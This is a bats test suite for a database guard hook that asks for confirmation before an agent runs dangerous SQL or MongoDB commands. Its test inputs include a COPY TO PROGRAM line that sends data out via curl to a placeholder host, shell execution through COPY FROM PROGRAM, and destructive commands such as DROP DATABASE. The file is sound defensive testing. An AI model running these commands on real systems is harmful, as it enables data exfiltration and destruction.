#!/usr/bin/env bats
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Database Guard Hook — unit tests
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# This hook stays, unlike most of command-guard's checks, because SQL semantics
# are genuinely unexpressible as a permission rule: Bash(psql:*) cannot tell
# SELECT from DROP TABLE.
#
# What changed in 2.0 is the decision. It used to exit 2 — a hard block with a
# forge-override escape hatch — for patterns that all have legitimate uses;
# dropping a table in a dev database is ordinary work. It now returns
# permissionDecision "ask", which shows the real statement and needs no bypass.

setup() {
  load '../helpers/test_helper'
  setup_sandbox
  HOOK="$SCRIPT_DIR/hooks/db-guard.sh"
}

teardown() {
  teardown_sandbox
}

# A crashed hook must NOT read as "allow" — see the note in command_guard.bats.
# Swallowing stderr and treating empty stdout as a decision made every
# assert_output "allow" here satisfiable by a hook that does not parse.
_decision() {
  local tmpfile="$TEST_SANDBOX/hook-input.json"
  local errfile="$TEST_SANDBOX/hook-stderr"
  jq -n --arg c "$1" '{"tool_input":{"command":$c}}' > "$tmpfile"

  local out rc
  out=$(bash "$HOOK" < "$tmpfile" 2>"$errfile"); rc=$?

  if [ "$rc" -ne 0 ]; then
    echo "HOOK-FAILED(exit=$rc)"
    return 0
  fi
  if [ -s "$errfile" ]; then
    echo "HOOK-FAILED(stderr: $(head -c 200 "$errfile"))"
    return 0
  fi
  [ -n "$out" ] || { echo "allow"; return 0; }

  local decision
  decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null) \
    || { echo "HOOK-FAILED(unparseable output)"; return 0; }
  [ -n "$decision" ] || { echo "HOOK-FAILED(no decision in output)"; return 0; }
  echo "$decision"
}

_reason() {
  local tmpfile="$TEST_SANDBOX/hook-input.json"
  jq -n --arg c "$1" '{"tool_input":{"command":$c}}' > "$tmpfile"
  bash "$HOOK" < "$tmpfile" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecisionReason // ""'
}

# ── Fast path: nothing to do without a database CLI ───────────

@test "allows commands with no database CLI" {
  run _decision 'ls -la'
  assert_output "allow"
}

@test "allows an npm build" {
  run _decision 'npm run build'
  assert_output "allow"
}

@test "allows a git log even when it mentions DROP TABLE" {
  run _decision 'git log --oneline --grep "DROP TABLE"'
  assert_output "allow"
}

@test "allows an empty command" {
  run _decision ''
  assert_output "allow"
}

# ── SQL-to-shell execution ────────────────────────────────────

@test "asks on COPY TO PROGRAM" {
  # Postgres runs the argument as a shell command with the server's privileges.
  # No Bash rule models this: Bash(psql:*) sees a database client, not a shell.
  run _decision "psql -c \"COPY t TO PROGRAM 'curl http://x -d @-'\""
  assert_output "ask"
}

@test "asks on COPY FROM PROGRAM" {
  run _decision "psql -c \"COPY t FROM PROGRAM 'whoami'\""
  assert_output "ask"
}

@test "explains COPY PROGRAM as remote code execution" {
  run _reason "psql -c \"COPY t TO PROGRAM 'id'\""
  assert_output --partial "executes a shell command"
}

# ── Destructive schema and data changes ───────────────────────

@test "asks on DROP TABLE" {
  run _decision 'psql -c "DROP TABLE users"'
  assert_output "ask"
}

@test "asks on DROP DATABASE" {
  run _decision 'psql -c "DROP DATABASE production"'
  assert_output "ask"
}

@test "asks on DROP SCHEMA" {
  run _decision 'psql -c "DROP SCHEMA public CASCADE"'
  assert_output "ask"
}

@test "asks on TRUNCATE" {
  run _decision 'psql -c "TRUNCATE TABLE events"'
  assert_output "ask"
}

@test "asks on DELETE FROM without a WHERE clause" {
  run _decision 'psql -c "DELETE FROM users"'
  assert_output "ask"
}

@test "allows DELETE FROM with a WHERE clause" {
  run _decision 'psql -c "DELETE FROM users WHERE id = 42"'
  assert_output "allow"
}

@test "asks on ALTER TABLE DROP COLUMN" {
  run _decision 'psql -c "ALTER TABLE users DROP COLUMN email"'
  assert_output "ask"
}

@test "matches SQL case-insensitively" {
  run _decision 'psql -c "drop table users"'
  assert_output "ask"
}

# ── Other database CLIs ───────────────────────────────────────

@test "guards mysql" {
  run _decision 'mysql -e "DROP TABLE users" mydb'
  assert_output "ask"
}

@test "guards sqlite3" {
  run _decision 'sqlite3 app.db "DROP TABLE sessions"'
  assert_output "ask"
}

@test "guards mongosh drop" {
  # The previous version of this test appended `&& psql -c "TRUNCATE t"`, so
  # the ask came entirely from the psql clause. mongosh speaks JavaScript, none
  # of the SQL patterns ever matched it, and the test said otherwise.
  run _decision 'mongosh --eval "db.users.drop()"'
  assert_output "ask"
}

@test "guards mongosh dropDatabase" {
  run _decision 'mongosh --eval "db.dropDatabase()"'
  assert_output "ask"
}

@test "guards an unfiltered mongosh deleteMany" {
  run _decision 'mongosh --eval "db.users.deleteMany({})"'
  assert_output "ask"
}

@test "allows a filtered mongosh deleteMany" {
  run _decision 'mongosh --eval "db.users.deleteMany({status: \"stale\"})"'
  assert_output "allow"
}

@test "allows a mongosh find" {
  run _decision 'mongosh --eval "db.users.find()"'
  assert_output "allow"
}

# ── Ordinary queries stay out of the way ──────────────────────

@test "allows a SELECT" {
  run _decision 'psql -c "SELECT * FROM users LIMIT 10"'
  assert_output "allow"
}

@test "allows an INSERT" {
  run _decision 'psql -c "INSERT INTO users (name) VALUES (\$1)"'
  assert_output "allow"
}

@test "allows an UPDATE with a WHERE clause" {
  run _decision 'psql -c "UPDATE users SET name = x WHERE id = 1"'
  assert_output "allow"
}

@test "allows CREATE TABLE" {
  run _decision 'psql -c "CREATE TABLE t (id int)"'
  assert_output "allow"
}

@test "allows a psql version check" {
  run _decision 'psql --version'
  assert_output "allow"
}

# ── forge-override is gone ────────────────────────────────────

@test "forge-override no longer bypasses the SQL guard" {
  run _decision "# forge-override: cleaning up
psql -c \"DROP TABLE users\""
  assert_output "ask"
}

# ── Degraded mode is audible ──────────────────────────────────

@test "records a DEGRADED line when it cannot inspect the command" {
  mkdir -p "$TEST_SANDBOX/bin" "$CLAUDE_DIR"
  printf '#!/bin/bash\nexit 127\n' > "$TEST_SANDBOX/bin/jq"
  chmod +x "$TEST_SANDBOX/bin/jq"

  jq -n '{"tool_input":{"command":"psql -c \"DROP TABLE t\""}}' > "$TEST_SANDBOX/in.json"
  run env PATH="$TEST_SANDBOX/bin:$PATH" CLAUDE_DIR="$CLAUDE_DIR" \
    bash "$HOOK" < "$TEST_SANDBOX/in.json"
  assert_success

  run grep -c 'DEGRADED hook=db-guard' "$CLAUDE_DIR/security.log"
  assert_success
  refute_output "0"
}

@test "a hook that cannot parse is reported, not read as allow" {
  local broken="$TEST_SANDBOX/broken-hook.sh"
  printf '#!/bin/bash\nif then fi\n' > "$broken"

  HOOK="$broken"
  run _decision 'psql -c "SELECT 1"'
  assert_output --partial "HOOK-FAILED"
  refute_output "allow"
}
